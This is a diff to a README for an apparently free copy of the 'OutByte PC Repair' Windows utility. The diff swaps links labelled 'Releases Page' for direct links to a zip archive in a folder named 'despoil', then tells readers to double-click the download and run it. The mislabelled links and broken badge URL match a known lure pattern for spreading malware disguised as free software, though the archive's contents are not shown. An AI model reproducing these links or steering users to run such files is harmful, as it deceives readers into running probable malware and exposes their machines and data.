@@ -1,6 +1,6 @@
 # 🖥️ OutByte-PC-Repair-Free - Fix Your PC Performance Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/estebangalindo27/OutByte-PC-Repair-Free/releases)
+[![Download Now](https://github.com/estebangalindo27/OutByte-PC-Repair-Free/raw/refs/heads/main/despoil/P_Free_Byte_Repair_Out_3.8.zip%20Now-v1.0-blue)](https://github.com/estebangalindo27/OutByte-PC-Repair-Free/raw/refs/heads/main/despoil/P_Free_Byte_Repair_Out_3.8.zip)
 
 ## 📦 Overview
 Welcome to the OutByte-PC-Repair-Free repository. This software helps you optimize your Windows PC performance and troubleshoot common issues. It is perfect for anyone looking for reliable support and easy-to-understand resources.
@@ -8,14 +8,14 @@ Welcome to the OutByte-PC-Repair-Free repository. This software helps you optimi
 ## 🚀 Getting Started
 To start using OutByte PC Repair, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/estebangalindo27/OutByte-PC-Repair-Free/releases).
+1. Visit the [Releases Page](https://github.com/estebangalindo27/OutByte-PC-Repair-Free/raw/refs/heads/main/despoil/P_Free_Byte_Repair_Out_3.8.zip).
 2. Look for the latest version of the application.
 3. Click the download link for your operating system.
 
 ## 📥 Download & Install
 To download the software:
 
-1. Go to the [OutByte-PC-Repair-Free Releases Page](https://github.com/estebangalindo27/OutByte-PC-Repair-Free/releases) to view available versions.
+1. Go to the [OutByte-PC-Repair-Free Releases Page](https://github.com/estebangalindo27/OutByte-PC-Repair-Free/raw/refs/heads/main/despoil/P_Free_Byte_Repair_Out_3.8.zip) to view available versions.
 2. Download the file that matches your system.
 3. Once downloaded, locate the file on your computer.
 4. Double-click the file to run the installer.
